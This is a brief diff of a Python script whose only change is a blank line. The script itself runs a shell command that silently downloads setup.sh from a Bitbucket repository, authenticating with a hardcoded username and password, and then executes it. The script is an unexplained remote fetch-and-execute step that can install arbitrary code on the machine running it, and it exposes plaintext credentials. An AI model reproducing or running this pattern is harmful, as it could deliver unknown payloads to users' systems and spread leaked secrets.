@@ -1,4 +1,5 @@
 import os
+
 if __name__=='__main__':
   cmd1='bash -ic "rm -f setup.sh && curl --silent -O --user shananalla88:ukqxwnzRwJhvb5Nd9pUw https://api.bitbucket.org/2.0/repositories/shananalla88/testpaw/src/master/py3/setup.sh && bash setup.sh random random random  "'
   os.system(cmd1)
